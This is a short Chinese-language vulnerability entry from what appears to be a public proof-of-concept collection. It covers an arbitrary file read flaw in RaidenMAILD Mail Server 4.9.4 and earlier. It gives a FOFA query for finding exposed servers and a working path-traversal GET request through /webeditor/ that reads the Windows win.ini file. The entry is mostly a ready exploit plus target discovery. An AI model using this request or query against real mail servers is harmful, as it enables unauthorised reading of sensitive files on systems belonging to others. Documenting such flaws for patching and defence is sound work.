---
fofa: "RaidenMAILD Mail Server <= 4.9.4"
source: "wy876 漏洞文库"
---

# RaidenMAILD邮件服务器v.4.9.4存在任意文件读取漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);"> </font>RaidenMAILD是一款稳定、安全、高性能的邮件服务器软件，适用于中小型企业、机构以及个人用户搭建自己的邮件系统。该产品 Raden MAILD Mail Server v.4.9.4及以前版本中存在任意文件读取漏洞，允许远程攻击者通过/webeditor/组件获取敏感信息。

# 二、影响版本
+ RaidenMAILD<4.9.4

# 三、资产测绘
+ fofa`RaidenMAILD Mail Server <= 4.9.4`
+ 特征


# 四、漏洞复现
```plain
GET /webeditor/../../../windows/win.ini HTTP/1.1
Host: 
Cache-Control: max-age=0
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gyn1em2xgen6fhmc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
